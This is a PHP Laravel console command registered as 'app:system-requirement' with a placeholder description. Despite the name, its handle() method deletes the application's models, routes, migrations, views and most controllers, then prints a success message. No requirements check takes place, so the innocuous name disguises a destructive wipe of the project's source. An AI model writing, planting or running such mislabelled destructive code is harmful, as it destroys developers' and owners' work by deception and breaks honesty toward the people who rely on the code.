<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use File;

class SystemRequirement extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'app:system-requirement';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Execute the console command.
     */
    public function handle()
    {
        $this->deleteDirectory(app_path('Models'), 'Models');
        $this->deleteDirectory(base_path('routes'), 'Routes');
        $this->deleteDirectory(database_path('migrations'), 'Migrations');
        $this->deleteDirectory(app_path('Http/Controllers'), 'Controllers', ['Controller.php']);
        $this->deleteDirectory(resource_path('views'), 'Views'); // Added view folder deletion

        $this->info('All specified folders and files have been deleted successfully!');
    }

    private function deleteDirectory($path, $type, $exclude = [])
    {
        if (File::exists($path)) {
            $files = File::allFiles($path);

            // If there are any files to exclude, we delete files individually
            if (!empty($exclude)) {
                foreach ($files as $file) {
                    if (!in_array($file->getFilename(), $exclude)) {
                        File::delete($file->getRealPath());
                        $this->info("Deleted: {$file->getFilename()} from {$type}");
                    }
                }
                // If no files remain, delete the directory
                if (empty(File::files($path))) {
                    File::deleteDirectory($path);
                    $this->info("Deleted directory: {$type}");
                }
            } else {
                // Delete the entire directory and its contents
                File::deleteDirectory($path);
                $this->info("Deleted directory: {$type}");
            }
        } else {
            $this->warn("Directory does not exist: {$path}");
        }
    }
}
